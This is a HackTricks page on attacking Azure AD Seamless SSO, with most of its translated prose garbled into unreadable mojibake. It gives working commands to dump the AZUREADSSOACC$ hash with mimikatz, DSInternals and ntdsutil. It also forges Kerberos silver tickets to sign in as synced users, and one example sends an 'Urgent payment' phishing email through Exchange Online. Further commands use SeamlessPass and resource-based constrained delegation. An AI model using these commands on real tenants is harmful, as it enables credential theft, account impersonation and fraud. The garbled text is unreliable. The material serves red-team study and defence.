# Az - Seamless SSO

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) è‡ªåŠ¨**åœ¨ç”¨æˆ·è¿æ¥åˆ°å…¬å¸ç½‘ç»œçš„å…¬å¸è®¾å¤‡ä¸Šè‡ªåŠ¨ç™»å½•**ã€‚å¯ç”¨åï¼Œ**ç”¨æˆ·æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½• Azure AD**ï¼Œé€šå¸¸ç”šè‡³æ— éœ€è¾“å…¥ç”¨æˆ·åã€‚æ­¤åŠŸèƒ½ä¸ºç”¨æˆ·æä¾›äº†è½»æ¾è®¿é—®åŸºäºäº‘çš„åº”ç”¨ç¨‹åºçš„æ–¹å¼ï¼Œè€Œæ— éœ€ä»»ä½•é¢å¤–çš„æœ¬åœ°ç»„ä»¶ã€‚

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption><p><a href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works</a></p></figcaption></figure>

åŸºæœ¬ä¸Šï¼ŒAzure AD Seamless SSO **åœ¨ç”¨æˆ·** **åœ¨æœ¬åœ°åŸŸåŠ å…¥çš„ PC ä¸Š** **è‡ªåŠ¨ç™»å½•**ã€‚

å®ƒæ”¯æŒ [**PHS (å¯†ç å“ˆå¸ŒåŒæ­¥)**](phs-password-hash-sync.md) å’Œ [**PTA (é€ä¼ èº«ä»½éªŒè¯)**](pta-pass-through-authentication.md)ã€‚

æ¡Œé¢ SSO ä½¿ç”¨ **Kerberos** è¿›è¡Œèº«ä»½éªŒè¯ã€‚é…ç½®åï¼ŒAzure AD Connect åœ¨æœ¬åœ° AD ä¸­åˆ›å»ºä¸€ä¸ªåä¸º **AZUREADSSOACC`$`** çš„ **è®¡ç®—æœºå¸æˆ·**ã€‚`AZUREADSSOACC$` å¸æˆ·çš„å¯†ç åœ¨é…ç½®æœŸé—´**ä»¥æ˜æ–‡å½¢å¼å‘é€åˆ° Azure AD**ã€‚

**Kerberos ç¥¨è¯**ä½¿ç”¨å¯†ç çš„ **NTHash (MD4)** è¿›è¡Œ **åŠ å¯†**ï¼ŒAzure AD ä½¿ç”¨å‘é€çš„å¯†ç è§£å¯†ç¥¨è¯ã€‚

**Azure AD** æš´éœ²ä¸€ä¸ª **ç«¯ç‚¹** (https://autologon.microsoftazuread-sso.com)ï¼Œæ¥å— Kerberos **ç¥¨è¯**ã€‚åŸŸåŠ å…¥æœºå™¨çš„æµè§ˆå™¨å°†ç¥¨è¯è½¬å‘åˆ°æ­¤ç«¯ç‚¹ä»¥å®ç° SSOã€‚

### On-prem -> cloud

ç”¨æˆ· **`AZUREADSSOACC$` çš„å¯†ç ä»ä¸æ›´æ”¹**ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜å¯ä»¥ç ´åè¯¥ **å¸æˆ·çš„å“ˆå¸Œ**ï¼Œç„¶åä½¿ç”¨å®ƒæ¥ **åˆ›å»ºé“¶ç¥¨** ä»¥è¿æ¥åˆ° Azureï¼Œä½¿ç”¨ **ä»»ä½•å·²åŒæ­¥çš„æœ¬åœ°ç”¨æˆ·**ï¼š
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
ä½¿ç”¨è¯¥å“ˆå¸Œï¼Œæ‚¨ç°åœ¨å¯ä»¥**ç”Ÿæˆé“¶ç¥¨**ï¼š
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
To utilize the silver ticket, the following steps should be executed:

1. **å¯åŠ¨æµè§ˆå™¨ï¼š** åº”å¯åŠ¨ Mozilla Firefoxã€‚
2. **é…ç½®æµè§ˆå™¨ï¼š**
* å¯¼èˆªåˆ° **`about:config`**ã€‚
* å°† [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) çš„é¦–é€‰é¡¹è®¾ç½®ä¸ºæŒ‡å®šçš„ [å€¼](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)ï¼š
* `https://aadg.windows.net.nsatc.net`
* `https://autologon.microsoftazuread-sso.com`
3. **è®¿é—®Webåº”ç”¨ç¨‹åºï¼š**
* è®¿é—®ä¸ç»„ç»‡çš„ AAD åŸŸé›†æˆçš„ Web åº”ç”¨ç¨‹åºã€‚ä¸€ä¸ªå¸¸è§çš„ä¾‹å­æ˜¯ [Office 365](https://portal.office.com/)ã€‚
4. **èº«ä»½éªŒè¯è¿‡ç¨‹ï¼š**
* åœ¨ç™»å½•å±å¹•ä¸Šï¼Œåº”è¾“å…¥ç”¨æˆ·åï¼Œå¯†ç å­—æ®µç•™ç©ºã€‚
* è¦ç»§ç»­ï¼Œè¯·æŒ‰ TAB æˆ– ENTERã€‚

{% hint style="success" %}
è¿™ä¸ä¼šç»•è¿‡å¯ç”¨çš„ MFA
{% endhint %}

#### é€‰é¡¹ 2 æ— éœ€ dcsync - SeamlessPass

ä¹Ÿå¯ä»¥ **åœ¨æ²¡æœ‰ dcsync æ”»å‡»** çš„æƒ…å†µä¸‹æ‰§è¡Œæ­¤æ”»å‡»ï¼Œä»¥æ›´éšè”½ï¼Œå¦‚ [åœ¨è¿™ç¯‡åšå®¢æ–‡ç« ä¸­è§£é‡Š](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/)ã€‚ä¸ºæ­¤ï¼Œæ‚¨åªéœ€è¦ä»¥ä¸‹ä¹‹ä¸€ï¼š

* **è¢«æ”»é™·ç”¨æˆ·çš„ TGTï¼š** å³ä½¿æ‚¨æ²¡æœ‰ï¼Œä½†ç”¨æˆ·è¢«æ”»é™·ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨è®¸å¤šå·¥å…·ä¸­å®ç°çš„å‡ TGT å§”æ‰˜æŠ€å·§è·å–ä¸€ä¸ªï¼Œä¾‹å¦‚ [Kekeo](https://x.com/gentilkiwi/status/998219775485661184) å’Œ [Rubeus](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9)ã€‚
* **é»„é‡‘ç¥¨è¯**ï¼šå¦‚æœæ‚¨æ‹¥æœ‰ KRBTGT å¯†é’¥ï¼Œæ‚¨å¯ä»¥ä¸ºè¢«æ”»å‡»ç”¨æˆ·åˆ›å»ºæ‰€éœ€çš„ TGTã€‚
* **è¢«æ”»é™·ç”¨æˆ·çš„ NTLM å“ˆå¸Œæˆ– AES å¯†é’¥ï¼š** SeamlessPass å°†ä½¿ç”¨æ­¤ä¿¡æ¯ä¸åŸŸæ§åˆ¶å™¨é€šä¿¡ä»¥ç”Ÿæˆ TGTã€‚
* **AZUREADSSOACC$ è´¦æˆ· NTLM å“ˆå¸Œæˆ– AES å¯†é’¥ï¼š** ä½¿ç”¨æ­¤ä¿¡æ¯å’Œç”¨æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦ (SID) è¿›è¡Œæ”»å‡»ï¼Œå¯ä»¥åˆ›å»ºæœåŠ¡ç¥¨è¯å¹¶ä¸äº‘è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆå¦‚å‰é¢çš„æ–¹æ³•æ‰€ç¤ºï¼‰ã€‚

æœ€åï¼Œä½¿ç”¨ TGT å¯ä»¥ä½¿ç”¨å·¥å…· [**SeamlessPass**](https://github.com/Malcrove/SeamlessPass) è¿›è¡Œï¼š 

{% code overflow="wrap" %}
```
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_TGT>
```
{% endcode %}

æœ‰å…³å°† Firefox è®¾ç½®ä¸ºä¸æ— ç¼ SSO ä¸€èµ·ä½¿ç”¨çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥åœ¨ [**æ­¤åšå®¢æ–‡ç« ä¸­æ‰¾åˆ°**](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/)ã€‚

#### ~~ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º Kerberos ç¥¨è¯~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

å¦‚æœ Active Directory ç®¡ç†å‘˜å¯ä»¥è®¿é—® Azure AD Connectï¼Œä»–ä»¬å¯ä»¥ **ä¸ºä»»ä½•äº‘ç”¨æˆ·è®¾ç½® SID**ã€‚è¿™æ ·ï¼ŒKerberos **ç¥¨è¯**ä¹Ÿå¯ä»¥ **ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º**ã€‚å”¯ä¸€çš„è¦æ±‚æ˜¯ SID æ˜¯ä¸€ä¸ªåˆé€‚çš„ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ã€‚

{% hint style="danger" %}
ä»…äº‘ç®¡ç†å‘˜ç”¨æˆ·çš„ SID ç°åœ¨ **è¢« Microsoft é˜»æ­¢**ã€‚\
æœ‰å…³ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### æœ¬åœ° -> äº‘é€šè¿‡åŸºäºèµ„æºçš„å—é™å§”æ´¾ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ä»»ä½•å¯ä»¥ç®¡ç†è®¡ç®—æœºå¸æˆ· (`AZUREADSSOACC$`) çš„äººï¼Œåœ¨è¯¥å¸æˆ·æ‰€åœ¨çš„å®¹å™¨æˆ– OU ä¸­ï¼Œéƒ½å¯ä»¥ **é…ç½®åŸºäºèµ„æºçš„å—é™å§”æ´¾å¹¶è®¿é—®å®ƒ**ã€‚
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: æˆ‘åœ¨ä½ çš„äº‘ä¸­ï¼Œé˜…è¯»æ¯ä¸ªäººçš„ç”µå­é‚®ä»¶ - é€šè¿‡ Active Directory é»‘å®¢æ”»å‡» Azure AD](https://www.youtube.com/watch?v=JEIR5oGCwdg)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="../../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æ”»å‡»ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
